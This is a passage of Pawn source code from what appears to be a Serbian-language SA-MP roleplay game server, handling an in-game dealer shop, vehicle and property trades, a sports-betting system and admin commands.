			  	KladionicaListic[ playerid ][ keciksdva ][ i ] = -1;
			  	KladionicaListic[ playerid ][ Kvota ][ i ] = 0.0;
			  	KladionicaListic[ playerid ][ teamID1 ][ i ] = -1;
				KladionicaListic[ playerid ][ teamID2 ][ i ] = -1;
			}
			KladionicaListic[ playerid ][ Uplaceno ] = false;
			KladionicaListic[ playerid ][ Zavrseno ] = false;
			KladionicaListic[ playerid ][ Uplata ] = 0;
		 	KladionicaListic[ playerid ][ Dobitak ] = 0;
		 	KladionicaListic[ playerid ][ Status ] = false;
			SaveKladionica( playerid );
			KladionicaTDControl( playerid, false );
		}
	}
	else if( dialogid == dialog_DONATORBOJA ) {
	
		if( response ) {

		    PlayerInfo[ playerid ][ xDBoja ] = listitem+1;
			DonatorBoja( playerid );
			SendInfoMessage( playerid, "Vasa boja imena je promenjena." );
			SavePlayer( playerid );
		}
	}
	else if( dialogid == DIALOG_DILER)
	{
		if( response )
		{
			//Laptop(12.000$)\nDinamit(30.000$)\nLazna Licna(150.000$)\nLazni Pasos(150.000$)
			switch(listitem)
			{
				case 0:
				{
					if(GetPlayerMoney(playerid) < 12000) return SendErrorMessage(playerid, "Nemas dovoljno novca");
					if(PlayerInfo[playerid][xLaptop] == 1) return SendErrorMessage(playerid, "Vec imas laptop");
					SendInfoMessage(playerid, "Uspesno si kupio laptop");
					DajIgracuNovac(playerid, -12000);
					PlayerInfo[playerid][xLaptop] = 1;
					return 1;
				}
				case 1:
				{
					if(GetPlayerMoney(playerid) < 15000) return SendErrorMessage(playerid, "Nemas dovoljno novca");
					if(PlayerInfo[playerid][xDinamit] > 3) return SendErrorMessage(playerid, "Ne mozes imati vise od 3 dinamita!");
					SendInfoMessage(playerid, "Uspesno si kupio dinamit");
					DajIgracuNovac(playerid, -15000);
					PlayerInfo[playerid][xDinamit] ++;
					return 1;
				}
				case 2:
				{
					if(GetPlayerMoney(playerid) < 150000) return SendErrorMessage(playerid, "Nemas dovoljno novca");
					if(PlayerInfo[playerid][xLaznaLicna] == 1) return SendErrorMessage(playerid, "Vec imas laznu licnu");
					SendInfoMessage(playerid, "Uspesno si kupio laznu licnu");
					DajIgracuNovac(playerid, -150000);
					PlayerInfo[playerid][xLaznaLicna] = 1;
					return 1;
				}
				case 3:
				{
					if(GetPlayerMoney(playerid) < 150000) return SendErrorMessage(playerid, "Nemas dovoljno novca");
					if(PlayerInfo[playerid][xLazniPasos] == 1) return SendErrorMessage(playerid, "Vec imas lazni pasos");
					SendInfoMessage(playerid, "Uspesno si kupio lazni pasos");
					DajIgracuNovac(playerid, -150000);
					PlayerInfo[playerid][xLazniPasos] = 1;
					return 1;
				}
                case 4: {

                    if(PlayerInfo[playerid][xWorkShopID] == -1) return SendErrorMessage(playerid, "Ne posedujes Bitcoin WorkShop!");

                    new id = PlayerInfo[playerid][xWorkShopID];

                    if(BitcoinInfo[id][bMasine] == 10) return SendErrorMessage(playerid, "Vec imas maksimalan broj masina");

                    new cena;
                    switch(BitcoinInfo[id][bMasine]) {

                        case 1: { cena = 200000; }
                        case 2: { cena = 400000; }
                        case 3: { cena = 600000; }
                        case 4: { cena = 800000; }
                        case 5: { cena = 1000000; }
                        case 6: { cena = 1200000; }
                        case 7: { cena = 1400000; }
                        case 8: { cena = 1600000; }
                        case 9: { cena = 1800000; }
                    }

                    new string[128];
                    format(string, sizeof(string), "Trenutan broj masina : [%d]\nCena sledece masine je : [%d$]", BitcoinInfo[id][bMasine], cena);

                    ShowPlayerDialog(playerid, dialog_KupiMasinu, DIALOG_STYLE_MSGBOX, "Kupovina Bitcoin Masine", string, "Kupi", "Odustani");

                    return 1;
                }
                case 5: {

                    if(GetPlayerMoney(playerid) < 15000) return SendErrorMessage(playerid, "Nemas dovoljno novca");
                    if(KokainTorba[playerid]) return SendErrorMessage(playerid, "Vec imas torbu za kokain");
                    SendInfoMessage(playerid, "Uspesno si kupio torbu za kokain!");
                    DajIgracuNovac(playerid, -15000);
                    KokainTorba[playerid] = true;

                    return 1;
                }
                case 6: {

                    if(GetPlayerMoney(playerid) < 3000) return SendErrorMessage(playerid, "Nemas dovoljno novca");
                    if(imaSrafciger[playerid]) return SendErrorMessage(playerid, "Vec imas srafciger");
                    SendInfoMessage(playerid, "Uspesno si kupio jednokratni srafciger!");
                    DajIgracuNovac(playerid, -3000);
                    imaSrafciger[playerid] = true;

                    return 1;
                }
			}
		}
	}

    if(dialogid == dialog_KupiMasinu) {

        if(!response) return 0;
        if(response) {

            if(PlayerInfo[playerid][xWorkShopID] == -1) return SendErrorMessage(playerid, "Ne posedujes Bitcoin WorkShop!");

            new id = PlayerInfo[playerid][xWorkShopID];

            if(BitcoinInfo[id][bMasine] == 10) return SendErrorMessage(playerid, "Vec imas maksimalan broj masina");

            new cena;
            switch(BitcoinInfo[id][bMasine]) {

                case 1: { cena = 200000; }
                case 2: { cena = 400000; }
                case 3: { cena = 600000; }
                case 4: { cena = 800000; }
                case 5: { cena = 1000000; }
                case 6: { cena = 1200000; }
                case 7: { cena = 1400000; }
                case 8: { cena = 1600000; }
                case 9: { cena = 1800000; }
            }

            if(GetPlayerMoney(playerid) < cena) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

            BitcoinInfo[id][bMasine]++;
            SacuvajBTCWorkShop(id);

            DajIgracuNovac(playerid, -cena);

            SendInfoMessage(playerid, "Uspesno si kupio Bitcoin Masinu za %d$!", cena);

            return 1;
        }
        return 1;
    }

	else if( dialogid == dialog_ZAMENA_1 ) {

		if( response ) {
		
		    new ponudjeno = Ponudjeno[ playerid ], trazeno = Trazio[ playerid ], igrac = GlobalProdaja[ playerid ], ID_1 = GlobalID[ playerid ], ID_2 = GlobalID_2[ playerid ];

			if( igrac == IPI ) return SendErrorMessage( playerid, "Taj igrac trenutno nije online." );
			
			if( ponudjeno >= 1 && ponudjeno <= 4 ) {

				strmid( VehicleInfo[ ID_1 ][ vOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 24);

				if( PlayerInfo[ igrac ][ xVoziloID ][ 0 ] == VehicleInfo[ ID_1 ][ vProvera ] ) { PlayerInfo[ igrac ][ xVoziloID ][ 0 ] = -1; }
			    else if( PlayerInfo[ igrac ][ xVoziloID ][ 1 ] == VehicleInfo[ ID_1 ][ vProvera ] ) { PlayerInfo[ igrac ][ xVoziloID ][ 1 ] = -1; }
			    else if( PlayerInfo[ igrac ][ xVoziloID ][ 2 ] == VehicleInfo[ ID_1 ][ vProvera ] ) { PlayerInfo[ igrac ][ xVoziloID ][ 2 ] = -1; }
			    else if( PlayerInfo[ igrac ][ xVoziloID ][ 3 ] == VehicleInfo[ ID_1 ][ vProvera ] ) { PlayerInfo[ igrac ][ xVoziloID ][ 3 ] = -1; }

				if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1) { PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = ID_1;}
				else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = ID_1; }
				else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = ID_1; }
				else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = ID_1; }

				SavePlayer( playerid ); SavePlayer( igrac );
				SaveVehicle( ID_1 );
				
				if( trazeno >= 1 && trazeno <= 4 ) {

					strmid( VehicleInfo[ ID_2 ][ vOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

					if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = -1; }

					if( PlayerInfo[ igrac ][ xVoziloID ][ 0 ] == -1){ PlayerInfo[ igrac ][ xVoziloID ][ 0 ] = ID_2;}
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 1 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 1 ] = ID_2; }
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 2 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 2 ] = ID_2; }
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 3 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 3 ] = ID_2; }

					SavePlayer( playerid ); SavePlayer( igrac );
					SaveVehicle( ID_2 );
				}
				else if( trazeno >= 5 && trazeno <= 7 ) {

				    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1; }
					else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1; }
					else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1; }

					if( PlayerInfo[ igrac ][ xProperty ][ 0 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 0 ] = ID_2; }
				    else if( PlayerInfo[ igrac ][ xProperty ][ 1 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 1 ] = ID_2; }
				    else if( PlayerInfo[ igrac ][ xProperty ][ 2 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 2 ] = ID_2; }

					strmid( II[ ID_2 ][ iOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 255);
					SaveProperty( ID_2 ); PropertyRefresh( ID_2 );
					SavePlayer( playerid ); SavePlayer( igrac );

				}
				else if( trazeno == 8 ) {

				    PlayerInfo[ playerid ][ xFirmaID ] = -1;
					PlayerInfo[ igrac ][ xFirmaID ] = ID_2;
					strmid( BussinesInfo[ ID_2 ][ bOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 255);
					SaveBussines( ID_2 ); Bussines_Refresh( ID_2 );
					SavePlayer( playerid ); SavePlayer( igrac );

				}
			}
			else if( ponudjeno >= 5 && ponudjeno <= 7 ) {
			
			    if( PlayerInfo[ igrac ][ xProperty ][ 0 ] == ID_1 ) { PlayerInfo[ igrac ][ xProperty ][ 0 ] = -1; }
				else if( PlayerInfo[ igrac ][ xProperty ][ 1 ] == ID_1 ) { PlayerInfo[ igrac ][ xProperty ][ 1 ] = -1; }
				else if( PlayerInfo[ igrac ][ xProperty ][ 2 ] == ID_1 ) { PlayerInfo[ igrac ][ xProperty ][ 2 ] = -1; }

				if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = ID_1; }
			    else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = ID_1; }
			    else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == -1 ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = ID_1; }

				strmid( II[ ID_1 ][ iOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
				SaveProperty( ID_1 ); PropertyRefresh( ID_1 );
				SavePlayer( playerid ); SavePlayer( igrac );
				
				if( trazeno >= 1 && trazeno <= 4 ) {

					strmid( VehicleInfo[ ID_2 ][ vOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

					if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = -1; }

					if( PlayerInfo[ igrac ][ xVoziloID ][ 0 ] == -1){ PlayerInfo[ igrac ][ xVoziloID ][ 0 ] = ID_2;}
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 1 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 1 ] = ID_2; }
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 2 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 2 ] = ID_2; }
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 3 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 3 ] = ID_2; }

					SavePlayer( playerid ); SavePlayer( igrac );
					SaveVehicle( ID_2 );
				}
				else if( trazeno >= 5 && trazeno <= 7 ) {

				    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1; }
					else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1; }
					else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1; }

					if( PlayerInfo[ igrac ][ xProperty ][ 0 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 0 ] = ID_2; }
				    else if( PlayerInfo[ igrac ][ xProperty ][ 1 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 1 ] = ID_2; }
				    else if( PlayerInfo[ igrac ][ xProperty ][ 2 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 2 ] = ID_2; }

					strmid( II[ ID_2 ][ iOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 255);
					SaveProperty( ID_2 ); PropertyRefresh( ID_2 );
					SavePlayer( playerid ); SavePlayer( igrac );

				}
				else if( trazeno == 8 ) {

				    PlayerInfo[ playerid ][ xFirmaID ] = -1;
					PlayerInfo[ igrac ][ xFirmaID ] = ID_2;
					strmid( BussinesInfo[ ID_2 ][ bOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 255);
					SaveBussines( ID_2 ); Bussines_Refresh( ID_2 );
					SavePlayer( playerid ); SavePlayer( igrac );

				}
			
			}
			else if( ponudjeno == 8 ) {
			
			    PlayerInfo[ igrac ][ xFirmaID ] = -1;
				PlayerInfo[ playerid ][ xFirmaID ] = ID_1;
				strmid( BussinesInfo[ ID_1 ][ bOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
				SaveBussines( ID_1 ); Bussines_Refresh( ID_1 );
				SavePlayer( playerid ); SavePlayer( igrac );
				
				if( trazeno >= 1 && trazeno <= 4 ) {

					strmid( VehicleInfo[ ID_2 ][ vOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 24);

					if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 0 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 1 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 2 ] = -1; }
				    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == VehicleInfo[ ID_2 ][ vProvera ] ) { PlayerInfo[ playerid ][ xVoziloID ][ 3 ] = -1; }

					if( PlayerInfo[ igrac ][ xVoziloID ][ 0 ] == -1){ PlayerInfo[ igrac ][ xVoziloID ][ 0 ] = ID_2;}
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 1 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 1 ] = ID_2; }
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 2 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 2 ] = ID_2; }
					else if( PlayerInfo[ igrac ][ xVoziloID ][ 3 ] == -1) { PlayerInfo[ igrac ][ xVoziloID ][ 3 ] = ID_2; }

					SavePlayer( playerid ); SavePlayer( igrac );
					SaveVehicle( ID_2 );
				}
				else if( trazeno >= 5 && trazeno <= 7 ) {

				    if( PlayerInfo[ playerid ][ xProperty ][ 0 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 0 ] = -1; }
					else if( PlayerInfo[ playerid ][ xProperty ][ 1 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 1 ] = -1; }
					else if( PlayerInfo[ playerid ][ xProperty ][ 2 ] == ID_2 ) { PlayerInfo[ playerid ][ xProperty ][ 2 ] = -1; }

					if( PlayerInfo[ igrac ][ xProperty ][ 0 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 0 ] = ID_2; }
				    else if( PlayerInfo[ igrac ][ xProperty ][ 1 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 1 ] = ID_2; }
				    else if( PlayerInfo[ igrac ][ xProperty ][ 2 ] == -1 ) { PlayerInfo[ igrac ][ xProperty ][ 2 ] = ID_2; }

					strmid( II[ ID_2 ][ iOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 255);
					SaveProperty( ID_2 ); PropertyRefresh( ID_2 );
					SavePlayer( playerid ); SavePlayer( igrac );

				}
				else if( trazeno == 8 ) {

				    PlayerInfo[ playerid ][ xFirmaID ] = -1;
					PlayerInfo[ igrac ][ xFirmaID ] = ID_2;
					strmid( BussinesInfo[ ID_2 ][ bOwner ], ImeIgraca( igrac ), 0, strlen( ImeIgraca( igrac ) ), 255);
					SaveBussines( ID_2 ); Bussines_Refresh( ID_2 );
					SavePlayer( playerid ); SavePlayer( igrac );

				}

			}
			
			Ponudjeno[ playerid ] = -1;
			Trazio[ playerid ] = -1;
			GlobalProdaja[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
			GlobalID_2[ playerid ] = -1;

		}
		else if( !response ) {
		}
	}
	return true;
}

stock GetPlayerIdFromName( playername[] ) {
	foreach( Player, i ) {
		if( IsPlayerConnected( i ) ) {
			new playername2[ MAX_PLAYER_NAME ] ;
			GetPlayerName(i, playername2, sizeof( playername2));
			if( strcmp( playername2, playername, true, strlen( playername) ) == 0 )
			{
				return i;
			}
		}
	}
	return INVALID_PLAYER_ID;
}

public OnPlayerClickPlayer( playerid, clickedplayerid, source ) {
	new string[ 128 ], name[ MAX_PLAYER_NAME ];
	GetPlayerName( clickedplayerid, name, sizeof( name ) );
	
    if(PlayerInfo[clickedplayerid][xBrojTelefona] != 0)
        format( string, sizeof( string ), "Ime: %s\nTelefon: %d", name, PlayerInfo[ clickedplayerid ][ xBrojTelefona ] );
    else
        format( string, sizeof( string ), "Ime: %s\nTelefon: Nema", name);
	SPD( playerid, 0, DSMSG, D_NASLOV, string, "Potvrdi", "" );
	return true;
}

//==================================[ Komande ]=================================
// Admin Sistem
CMD:server( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	SPD( playerid, dialog_SERVERMI, DSL, D_NASLOV, "Upravljanje serverom\nSacuvaj naloge\nNapravi\nIzbrisi\nIzmeni\nSpisak organizacija\nAntiCheat", D_ODABERI, D_ODUSTANI );
	return true;
}

CMD:trenutnekordinate( playerid, params[] ) {
	new Float:Pos[ 3 ];
	if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	SendInfoMessage( playerid, "Trenutno ste na kordinatama %f %f %f.", Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	return true;
}

CMD:sastavitiket( playerid, params[] ) {

	if( uFirmi[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u kladionici." );
    if( BussinesInfo[ uFirmi[ playerid ] ][ bType ] != VRSTA_KLAD ) return SendErrorMessage( playerid, "Morate biti u kladionici." );

	if( KladionicaListic[ playerid ][ Uplaceno ] ) {
		SendErrorMessage( playerid, "Vec imas uplacen tiket." );
		SendErrorMessage( playerid, "Ukoliko hoces novi moras stari da bacis." );
		SendErrorMessage( playerid, "Komanda /bacitiket." );
		return true;
	}

	if( PlayerInfo[ playerid ][ xGodine ] < 18 ) return SendErrorMessage( playerid, "Nemate 18 godina." );

	if( !ListaPrikazana[ playerid ] ) {
		KladionicaTDControl( playerid, true );
		ClearChat( playerid, 25 );
		SendInfoMessage( playerid, "Da ugasis listu kucaj /sastavitiket." );
	}
	else if( ListaPrikazana[ playerid ] ) {
		KladionicaTDControl( playerid, false );
	}
    return true;
}

CMD:bacitiket( playerid, params[] ) {

	if( !KladionicaListic[ playerid ][ Uplaceno ] ) return SendErrorMessage( playerid, "Nemate uplacen tiket." );
	
	for(  new i = 0; i < 10; i++ ) {
	  	KladionicaListic[ playerid ][ parID ][ i ] = -1;
	  	KladionicaListic[ playerid ][ keciksdva ][ i ] = -1;
	  	KladionicaListic[ playerid ][ Kvota ][ i ] = 0.0;
	  	KladionicaListic[ playerid ][ teamID1 ][ i ] = -1;
		KladionicaListic[ playerid ][ teamID2 ][ i ] = -1;
	}
	KladionicaListic[ playerid ][ Uplaceno ] = false;
	KladionicaListic[ playerid ][ Zavrseno ] = false;
	KladionicaListic[ playerid ][ Uplata ] = 0;
 	KladionicaListic[ playerid ][ Dobitak ] = 0;
 	KladionicaListic[ playerid ][ Status ] = false;
 	
 	SendInfoMessage( playerid, "Uspesno ste bacili tiket." );
    return true;
}

CMD:rezultati( playerid, params[] ) {

	if( uFirmi[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u kladionici." );
    if( BussinesInfo[ uFirmi[ playerid ] ][ bType ] != VRSTA_KLAD ) return SendErrorMessage( playerid, "Morate biti u kladionici." );

	if( PlayerInfo[ playerid ][ xGodine ] < 18 ) return SendErrorMessage( playerid, "Nemate 18 godina." );

    if( !RezultatiPrikazana[ playerid ] ) {
		RezultatiTDControl( playerid, true );
		ClearChat( playerid, 25 );
		SendInfoMessage( playerid, "Da ugasis listu rezultata kucaj /rezultati." );
	}
	else if( RezultatiPrikazana[ playerid ] ) {
		RezultatiTDControl( playerid, false );
	}
    return true;
}

CMD:podignitiket( playerid, params[] ) {

    if( uFirmi[ playerid ] == -1 ) return SendErrorMessage( playerid, "Morate biti u kladionici." );
    if( BussinesInfo[ uFirmi[ playerid ] ][ bType ] != VRSTA_KLAD ) return SendErrorMessage( playerid, "Morate biti u kladionici." );

	if( PlayerInfo[ playerid ][ xGodine ] < 18 ) return SendErrorMessage( playerid, "Nemate 18 godina." );

	if( !KladionicaListic[ playerid ][ Uplaceno ] ) return SendErrorMessage( playerid, "Nemate uplacen tiket." );
	if( !KladionicaListic[ playerid ][ Zavrseno ] ) return SendErrorMessage( playerid, "Utakmice nisu zavrsene." );
	if( !KladionicaListic[ playerid ][ Status ] ) return SendErrorMessage( playerid, "Vas tiket nije prosao." );
	
	DajIgracuNovac( playerid, floatround( KladionicaListic[ playerid ][ Dobitak ] ) );
	
	SendInfoMessage( playerid, "Dobili ste %.2f$ na kladionici. Cestitamo.", KladionicaListic[ playerid ][ Dobitak ] );
	
	for(  new i = 0; i < 10; i++ ) {
	  	KladionicaListic[ playerid ][ parID ][ i ] = -1;
	  	KladionicaListic[ playerid ][ keciksdva ][ i ] = -1;
	  	KladionicaListic[ playerid ][ Kvota ][ i ] = 0.0;
	  	KladionicaListic[ playerid ][ teamID1 ][ i ] = -1;
		KladionicaListic[ playerid ][ teamID2 ][ i ] = -1;
	}
	KladionicaListic[ playerid ][ Uplaceno ] = false;
	KladionicaListic[ playerid ][ Zavrseno ] = false;
	KladionicaListic[ playerid ][ Uplata ] = 0;
 	KladionicaListic[ playerid ][ Dobitak ] = 0;
 	KladionicaListic[ playerid ][ Status ] = false;
	
    return true;
}

CMD:mojlistic( playerid, params[] ) {

	if( !KladionicaListic[ playerid ][ Uplaceno ] ) return SendErrorMessage( playerid, "Nemate uplacen tiket." );
	if( !MojListicPrikazan[ playerid ] ) {
		KladionicaListicTDControl( playerid, true );
		ClearChat( playerid, 25 );
		SendInfoMessage( playerid, "Da ugasis prikaz tiketa kucaj /mojlistic." );
	}
	else if( MojListicPrikazan[ playerid ] ) {
		KladionicaListicTDControl( playerid, false );
	}
    return true;
}

CMD:adresa( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

    new adresa[ 38 ];

    if( sscanf( params, "s[38]", adresa ) ) {
		SendUsageMessage( playerid, "/adresa [ Nova adresa ]");
		return 1;
	}
    new im = GetNearestProperty( playerid );
	if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
	if( strlen( params ) > 38 ) return SendErrorMessage( playerid, "Adresa ne moze biti duza od 38 karaktera." );

	strmid( II[ im ][ iAdress ], adresa, 0, strlen( adresa ), 32);
	SaveProperty( im );
	PropertyRefresh( im );

    return true;
}

CMD:neaktivnost( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	new izbor, id, File[ 64 ];
	
	if( sscanf( params, "ii", izbor, id ) ) {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/neaktivnost [ izbor ] [ ID ]");
		SCM( playerid, BELA, "[Izbor] 1. imovina | 2. firma | 3. vozilo");
     	SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( izbor == 1 ) {
		format( File, sizeof( File ), IM_FILE, id );
		if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta imovina(ID) ne postoji u bazi podataka!");
	    
	    SendInfoMessage( playerid, "Neaktivnost imovine ID - %d je %dh.", id, II[ id ][ iNeaktivnost ] );
	}
	else if( izbor == 2 ) {
		format( File, sizeof( File ), F_FILE, id );
		if( !fexist( File ) ) return SendErrorMessage( playerid, "Ta firma(ID) ne postoji u bazi podataka!");

	    SendInfoMessage( playerid, "Neaktivnost firme ID - %d je %dh.", id, BussinesInfo[ id ][ bNeaktivnost ] );
	}
	else if( izbor == 3 ) {
		format( File, sizeof( File ), V_FILE, id );
		if( !fexist( File ) ) return SendErrorMessage( playerid, "To vozilo(ID) ne postoji u bazi podataka!");

	    SendInfoMessage( playerid, "Neaktivnost vozila ID - %d je %dh.", id, VehicleInfo[ id ][ vNeaktivnost ] );
	}
	else return SendErrorMessage( playerid, "Pogresan izbor( 1-3 )." );
	return true;
}

CMD:edit( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	new vrsta, izbor, kolicina;

    if( sscanf( params, "iii", vrsta, izbor, kolicina ) ) {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/edit [ izbor 1 ] [ izbor 2 ] [ kolicina ]");
		SCM( playerid, BELA, "[Izbor 1] 1. imovina | 2. firma ");
		SCM( playerid, BELA, "[Izbor 2] 1. level | 2. cena ");
     	SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( vrsta == 1 ) {
	    new id = GetNearestProperty( playerid );
	    if( GetNearestProperty( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema imovine u vasoj blizini!" );
		if( izbor == 1 ) {
		    II[ id ][ iLevel ] = kolicina;
			PropertyRefresh( id );
			SaveProperty( id );
			format( globalstring, sizeof( globalstring ), "Izmenili ste level imovine(ID: %d) u %d!", id, II[ id ][ iLevel ] );
			SCM( playerid, SRVBOJA1, globalstring );
			
			new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Admin %s je izmenio level na imovini ID %d u %d", ImeIgraca( playerid ), id, kolicina );
			LogSave( "Ostalo/LogEditCommand.log", string1 );
			
		}
		else if( izbor == 2 ) {
		    II[ id ][ iPrice ] = kolicina;
			PropertyRefresh( id );
